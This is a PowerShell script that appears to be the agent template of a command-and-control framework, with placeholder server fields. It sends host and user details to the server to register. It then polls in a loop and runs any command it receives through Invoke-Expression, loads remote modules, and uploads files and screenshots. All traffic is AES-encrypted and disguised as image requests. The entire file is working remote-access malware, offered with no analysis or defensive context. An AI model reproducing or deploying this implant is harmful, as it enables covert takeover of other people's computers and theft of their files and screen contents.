$beacon=1
function CAM ($key,$IV){
try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
$a.Mode = [System.Security.Cryptography.CipherMode]::CBC
$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$a.BlockSize = 128
$a.KeySize = 256
if ($IV)
{
if ($IV.getType().Name -eq "String")
{$a.IV = [System.Convert]::FromBase64String($IV)}
else
{$a.IV = $IV}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{$a.Key = [System.Convert]::FromBase64String($key)}
else
{$a.Key = $key}
}
$a}


function ENC ($key,$un,$file=0){
if ($file -eq 0){
$b = [System.Text.Encoding]::UTF8.GetBytes($un)}
else{
$b=$un}
$a = CAM $key
$e = $a.CreateEncryptor()
$f = $e.TransformFinalBlock($b, 0, $b.Length)
[byte[]] $p = $a.IV + $f
[System.Convert]::ToBase64String($p)
}


function DEC ($key,$enc,$file=0){
$b = [System.Convert]::FromBase64String($enc)
$IV = $b[0..15]
$a = CAM $key $IV
$d = $a.CreateDecryptor()
$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
if ($file -eq 0){
[System.Text.Encoding]::UTF8.GetString($u)
}
else{
return $u}
}

function scr($test){
$temp=$env:temp
$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$File = "$temp\$random.tmp"
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Screen.Left, $Screen.Top, 0, 0, $bitmap.Size)
$bitmap.Save($File)
$file_content = Get-Content $File -Encoding Byte
$content = enc -key $key -un $file_content -file 1

            $postParams = @{data=":$content`:"}
            $re=Invoke-WebRequest -Uri {{HTTP}}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams


$final=[System.Convert]::FromBase64String($content)
echo $final  | Set-Content $File -Encoding Byte
rm $File
return $output
}


      function dn($filename){

                        try{

                  $file_content = Get-Content -LiteralPath $filename -Encoding Byte
                  if ($file_content.Length -eq 0){
                  return $Error[0]}
                  }
                  catch{
                  $output = $Error[0] | Out-String;
                  return $output
                  }
            $content = enc -key $key -un $file_content -file 1


            $postParams = @{f=$filename;d=$content}
            $output=Invoke-WebRequest -Uri {{HTTP}}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
            #echo "returned $re.RawContent"


            return $output
            }


function up($filename){

$filenameenc=enc -key $key -un $filename


$re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{upload}?page=$filenameenc -Method GET

$data=dec -key $key -enc $re.Content -file 1

echo $data | Set-Content $filename -Encoding Byte
}


      function load($module)
      {
      #echo "Test"

            $modulename = enc -key $key -un $module
            $postParams = @{data=$modulename}
            $re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{md}?page=$agent -Method POST -Body $postParams
            #echo "returned $re.RawContent"
            $modulecontent=dec -key $key -enc $re.Content


      return $modulecontent
      }

$hostname = $env:COMPUTERNAME;
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ $t="*"}
$whoami = $env:USERNAME;
$whoami ="$t$whoami"
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;
$IP=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$agent="$random-img.jpeg"
$finaldata="data=$os**$IP**$arch**$hostname**$domain**$whoami**$pid"
$wc3 = new-object net.WebClient
      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
$progressPreference = 'silentlyContinue';

$wc3 = New-Object system.Net.WebClient;
while($true){
$req = [System.Net.WebRequest]::Create("{HTTP}://{ip}:{port}{cmd}?page=$agent")
$resp = $req.GetResponse()
$reqstream = $resp.GetResponseStream()
$stream = new-object System.IO.StreamReader $reqstream
$enc = $stream.ReadToEnd()


if($enc -eq "REGISTER"){
$wc3 = new-object net.WebClient
      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $key=$wc3.UploadString("{HTTP}://{ip}:{port}{register}?page=$agent",$finaldata)
$progressPreference = 'silentlyContinue';
continue
}
if($enc -eq "kill"){
exit
}

if($enc -eq "-"){
sleep $beacon
}
else{
$cm=dec -key $key -enc $enc

if($cm.split(" ")[0] -eq "upload"){
$f=$cm.split(" ")[1]
$output=up -filename $f

}

elseif($cm.split(" ")[0] -eq "download"){
echo $cm.split("`"").Length
if ($cm.split("`"").Length -gt 1)
{
$f=$cm.split("`"")[1].split("`"")[0]
}
else{
$f=$cm.split(" ")[1]
}
$output=dn -filename $f

}
elseif($cm.split(" ")[0] -eq "screenshot"){
$output=scr  -test 0
Continue
}
elseif($cm.split(" ")[0] -eq "set-beacon"){
$f=$cm.split(" ")[1]
$beacon=[int]$f
$output="beacon changed successfully"

}
elseif($cm.split(" ")[0] -eq "load"){
$f=$cm.split(" ")[1]
$module=load -module $f
echo "$f $module"
try{
$output=Invoke-Expression ($module) -ErrorVariable badoutput | Out-String
        }
        catch{
        $output = $Error[0] | Out-String;
        }
        if ($output.Length -eq 0){
        $output="$output$badoutput"
        }


}
else{
try{
$output=Invoke-Expression ($cm) -ErrorVariable badoutput | Out-String
        }
        catch{
        $output = $Error[0] | Out-String;
        }
        if ($output.Length -eq 0){
        $output="$output$badoutput"
        }}

  if ($output.Length -eq 0){
$output="$output$badoutput"
}

$redata=enc -key $key -un $output


$postParams = @{data=$redata}

$re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{re}?page=$agent -Method POST -Body $postParams

#$re = $wc3.UploadString("{HTTP}://{ip}:{port}{re}?page=$agent","data=$redata");

}
}
